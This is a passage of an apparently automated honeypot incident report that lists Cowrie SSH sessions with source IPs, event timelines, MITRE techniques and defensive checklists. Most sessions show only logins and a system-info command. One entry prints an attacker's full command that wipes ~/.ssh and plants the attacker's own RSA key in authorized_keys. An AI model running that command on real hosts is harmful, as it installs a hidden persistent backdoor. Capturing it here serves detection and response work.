| `2026-07-06 09:26:10` | `cowrie.command.input` |
| `2026-07-06 09:26:10` | `cowrie.log.closed` |
| `2026-07-06 09:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2950f973cde

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:13` | `cowrie.session.connect` |
| `2026-07-06 09:26:13` | `cowrie.client.version` |
| `2026-07-06 09:26:13` | `cowrie.client.kex` |
| `2026-07-06 09:26:14` | `cowrie.login.success` |
| `2026-07-06 09:26:14` | `cowrie.direct-tcpip.request` |
| `2026-07-06 09:26:14` | `cowrie.direct-tcpip.ja4` |
| `2026-07-06 09:26:14` | `cowrie.direct-tcpip.data` |
| `2026-07-06 09:26:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f423aede634

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:30` | `cowrie.session.connect` |
| `2026-07-06 09:26:30` | `cowrie.client.version` |
| `2026-07-06 09:26:31` | `cowrie.client.kex` |
| `2026-07-06 09:26:32` | `cowrie.login.success` |
| `2026-07-06 09:26:34` | `cowrie.session.params` |
| `2026-07-06 09:26:34` | `cowrie.command.input` |
| `2026-07-06 09:26:34` | `cowrie.log.closed` |
| `2026-07-06 09:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f359398ffa8c

| Field | Detail |
|---|---|
| **Source IP** | `198.23.232[.]146` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:32` | `cowrie.session.connect` |
| `2026-07-06 09:26:32` | `cowrie.client.version` |
| `2026-07-06 09:26:32` | `cowrie.client.kex` |
| `2026-07-06 09:26:32` | `cowrie.login.success` |
| `2026-07-06 09:26:33` | `cowrie.session.params` |
| `2026-07-06 09:26:33` | `cowrie.command.input` |
| `2026-07-06 09:26:33` | `cowrie.command.failed` |
| `2026-07-06 09:26:34` | `cowrie.log.closed` |
| `2026-07-06 09:26:34` | `cowrie.session.params` |
| `2026-07-06 09:26:34` | `cowrie.command.input` |
| `2026-07-06 09:26:34` | `cowrie.session.file_download` |
| `2026-07-06 09:26:34` | `cowrie.log.closed` |
| `2026-07-06 09:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.232[.]146` to AbuseIPDB if not already reported
- [ ] Block `198.23.232[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24c649ed66f4

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:34` | `cowrie.session.connect` |
| `2026-07-06 09:26:34` | `cowrie.client.version` |
| `2026-07-06 09:26:34` | `cowrie.client.kex` |
| `2026-07-06 09:26:35` | `cowrie.login.success` |
| `2026-07-06 09:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c5fe07d8d9

| Field | Detail |
|---|---|
| **Source IP** | `198.23.232[.]146` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:34` | `cowrie.session.connect` |
| `2026-07-06 09:26:34` | `cowrie.client.version` |
| `2026-07-06 09:26:34` | `cowrie.client.kex` |
| `2026-07-06 09:26:34` | `cowrie.login.success` |
| `2026-07-06 09:26:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.232[.]146` to AbuseIPDB if not already reported
- [ ] Block `198.23.232[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d02804488d

| Field | Detail |
|---|---|
| **Source IP** | `198.23.232[.]146` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:34` | `cowrie.session.connect` |
| `2026-07-06 09:26:34` | `cowrie.client.version` |
| `2026-07-06 09:26:34` | `cowrie.client.kex` |
| `2026-07-06 09:26:35` | `cowrie.login.success` |
| `2026-07-06 09:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `198.23.232[.]146` to AbuseIPDB if not already reported
- [ ] Block `198.23.232[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccc4fd52f1a

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]20` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:35` | `cowrie.session.connect` |
| `2026-07-06 09:26:35` | `cowrie.client.version` |
| `2026-07-06 09:26:35` | `cowrie.client.kex` |
| `2026-07-06 09:26:36` | `cowrie.login.success` |
| `2026-07-06 09:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]20` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1018e3158ce

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:32 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:57` | `cowrie.session.connect` |
| `2026-07-06 09:26:57` | `cowrie.client.version` |
| `2026-07-06 09:26:57` | `cowrie.client.kex` |
| `2026-07-06 09:27:00` | `cowrie.login.success` |
| `2026-07-06 09:27:02` | `cowrie.session.params` |
| `2026-07-06 09:27:02` | `cowrie.command.input` |
| `2026-07-06 09:27:02` | `cowrie.log.closed` |
| `2026-07-06 09:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50945bcaaadd

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:26 |
| **Last Seen** | 2026-07-06 09:32 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:26:57` | `cowrie.session.connect` |
| `2026-07-06 09:26:57` | `cowrie.client.version` |
| `2026-07-06 09:26:57` | `cowrie.client.kex` |
| `2026-07-06 09:27:00` | `cowrie.login.success` |
| `2026-07-06 09:27:01` | `cowrie.session.params` |
| `2026-07-06 09:27:01` | `cowrie.command.input` |
| `2026-07-06 09:27:02` | `cowrie.log.closed` |
| `2026-07-06 09:32:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-762843837afb

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:09` | `cowrie.session.connect` |
| `2026-07-06 09:27:09` | `cowrie.client.version` |
| `2026-07-06 09:27:09` | `cowrie.client.kex` |
| `2026-07-06 09:27:10` | `cowrie.login.success` |
| `2026-07-06 09:27:11` | `cowrie.session.params` |
| `2026-07-06 09:27:11` | `cowrie.command.input` |
| `2026-07-06 09:27:12` | `cowrie.log.closed` |
| `2026-07-06 09:27:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b3dccf5a741

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:10` | `cowrie.session.connect` |
| `2026-07-06 09:27:10` | `cowrie.client.version` |
| `2026-07-06 09:27:10` | `cowrie.client.kex` |
| `2026-07-06 09:27:12` | `cowrie.login.success` |
| `2026-07-06 09:27:13` | `cowrie.session.params` |
| `2026-07-06 09:27:13` | `cowrie.command.input` |
| `2026-07-06 09:27:13` | `cowrie.log.closed` |
| `2026-07-06 09:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f3cf79bb01

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:11` | `cowrie.session.connect` |
| `2026-07-06 09:27:11` | `cowrie.client.version` |
| `2026-07-06 09:27:12` | `cowrie.client.kex` |
| `2026-07-06 09:27:13` | `cowrie.login.success` |
| `2026-07-06 09:27:14` | `cowrie.session.params` |
| `2026-07-06 09:27:14` | `cowrie.command.input` |
| `2026-07-06 09:27:14` | `cowrie.log.closed` |
| `2026-07-06 09:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f5a27a4da4

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:12` | `cowrie.session.connect` |
| `2026-07-06 09:27:12` | `cowrie.client.version` |
| `2026-07-06 09:27:13` | `cowrie.client.kex` |
| `2026-07-06 09:27:14` | `cowrie.login.success` |
| `2026-07-06 09:27:15` | `cowrie.session.params` |
| `2026-07-06 09:27:15` | `cowrie.command.input` |
| `2026-07-06 09:27:16` | `cowrie.log.closed` |
| `2026-07-06 09:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a206a3e7c675

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:14` | `cowrie.session.connect` |
| `2026-07-06 09:27:14` | `cowrie.client.version` |
| `2026-07-06 09:27:14` | `cowrie.client.kex` |
| `2026-07-06 09:27:16` | `cowrie.login.success` |
| `2026-07-06 09:27:16` | `cowrie.session.params` |
| `2026-07-06 09:27:16` | `cowrie.command.input` |
| `2026-07-06 09:27:17` | `cowrie.log.closed` |
| `2026-07-06 09:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-690852757513

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:15` | `cowrie.session.connect` |
| `2026-07-06 09:27:15` | `cowrie.client.version` |
| `2026-07-06 09:27:16` | `cowrie.client.kex` |
| `2026-07-06 09:27:17` | `cowrie.login.success` |
| `2026-07-06 09:27:18` | `cowrie.session.params` |
| `2026-07-06 09:27:18` | `cowrie.command.input` |
| `2026-07-06 09:27:18` | `cowrie.log.closed` |
| `2026-07-06 09:27:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b886dd510bfc

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:16` | `cowrie.session.connect` |
| `2026-07-06 09:27:16` | `cowrie.client.version` |
| `2026-07-06 09:27:17` | `cowrie.client.kex` |
| `2026-07-06 09:27:18` | `cowrie.login.success` |
| `2026-07-06 09:27:19` | `cowrie.session.params` |
| `2026-07-06 09:27:19` | `cowrie.command.input` |
| `2026-07-06 09:27:20` | `cowrie.log.closed` |
| `2026-07-06 09:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31fbc45d388f

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:17` | `cowrie.session.connect` |
| `2026-07-06 09:27:17` | `cowrie.client.version` |
| `2026-07-06 09:27:18` | `cowrie.client.kex` |
| `2026-07-06 09:27:19` | `cowrie.login.success` |
| `2026-07-06 09:27:20` | `cowrie.session.params` |
| `2026-07-06 09:27:20` | `cowrie.command.input` |
| `2026-07-06 09:27:20` | `cowrie.log.closed` |
| `2026-07-06 09:27:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3d980ce2d94

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:18` | `cowrie.session.connect` |
| `2026-07-06 09:27:18` | `cowrie.client.version` |
| `2026-07-06 09:27:18` | `cowrie.client.kex` |
| `2026-07-06 09:27:20` | `cowrie.login.success` |
| `2026-07-06 09:27:21` | `cowrie.session.params` |
| `2026-07-06 09:27:21` | `cowrie.command.input` |
| `2026-07-06 09:27:21` | `cowrie.log.closed` |
| `2026-07-06 09:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1243fa909ef2

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:21` | `cowrie.session.connect` |
| `2026-07-06 09:27:21` | `cowrie.client.version` |
| `2026-07-06 09:27:21` | `cowrie.client.kex` |
| `2026-07-06 09:27:22` | `cowrie.login.success` |
| `2026-07-06 09:27:23` | `cowrie.session.params` |
| `2026-07-06 09:27:23` | `cowrie.command.input` |
| `2026-07-06 09:27:23` | `cowrie.log.closed` |
| `2026-07-06 09:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b828ba0ac04

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:23` | `cowrie.session.connect` |
| `2026-07-06 09:27:23` | `cowrie.client.version` |
| `2026-07-06 09:27:23` | `cowrie.client.kex` |
| `2026-07-06 09:27:24` | `cowrie.login.success` |
| `2026-07-06 09:27:25` | `cowrie.session.params` |
| `2026-07-06 09:27:25` | `cowrie.command.input` |
| `2026-07-06 09:27:25` | `cowrie.log.closed` |
| `2026-07-06 09:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf6ed2e8ac34

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:24` | `cowrie.session.connect` |
| `2026-07-06 09:27:24` | `cowrie.client.version` |
| `2026-07-06 09:27:24` | `cowrie.client.kex` |
| `2026-07-06 09:27:26` | `cowrie.login.success` |
| `2026-07-06 09:27:27` | `cowrie.session.params` |
| `2026-07-06 09:27:27` | `cowrie.command.input` |
| `2026-07-06 09:27:27` | `cowrie.log.closed` |
| `2026-07-06 09:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64260dee80d7

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:29` | `cowrie.session.connect` |
| `2026-07-06 09:27:29` | `cowrie.client.version` |
| `2026-07-06 09:27:29` | `cowrie.client.kex` |
| `2026-07-06 09:27:30` | `cowrie.login.success` |
| `2026-07-06 09:27:31` | `cowrie.session.params` |
| `2026-07-06 09:27:31` | `cowrie.command.input` |
| `2026-07-06 09:27:31` | `cowrie.log.closed` |
| `2026-07-06 09:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae97c33d1477

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:32` | `cowrie.session.connect` |
| `2026-07-06 09:27:32` | `cowrie.client.version` |
| `2026-07-06 09:27:32` | `cowrie.client.kex` |
| `2026-07-06 09:27:33` | `cowrie.login.success` |
| `2026-07-06 09:27:34` | `cowrie.session.params` |
| `2026-07-06 09:27:34` | `cowrie.command.input` |
| `2026-07-06 09:27:34` | `cowrie.log.closed` |
| `2026-07-06 09:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd06c592c4c6

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:33` | `cowrie.session.connect` |
| `2026-07-06 09:27:33` | `cowrie.client.version` |
| `2026-07-06 09:27:33` | `cowrie.client.kex` |
| `2026-07-06 09:27:34` | `cowrie.login.success` |
| `2026-07-06 09:27:36` | `cowrie.session.params` |
| `2026-07-06 09:27:36` | `cowrie.command.input` |
| `2026-07-06 09:27:36` | `cowrie.log.closed` |
| `2026-07-06 09:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.24.63[.]85` to AbuseIPDB if not already reported
- [ ] Block `103.24.63[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2b19fb54436

| Field | Detail |
|---|---|
| **Source IP** | `103.24.63[.]85` |
| **First Seen** | 2026-07-06 09:27 |
| **Last Seen** | 2026-07-06 09:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 09:27:34` | `cowrie.session.connect` |
| `2026-07-06 09:27:34` | `cowrie.client.version` |
| `2026-07-06 09:27:34` | `cowrie.client.kex` |
| `2026-07-06 09:27:36` | `cowrie.login.success` |
| `2026-07-06 09:27:37` | `cowrie.session.params` |
| `2026-07-06 09:27:37` | `cowrie.command.input` |
| `2026-07-06 09:27:37` | `cowrie.log.closed` |
| `2026-07-06 09:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
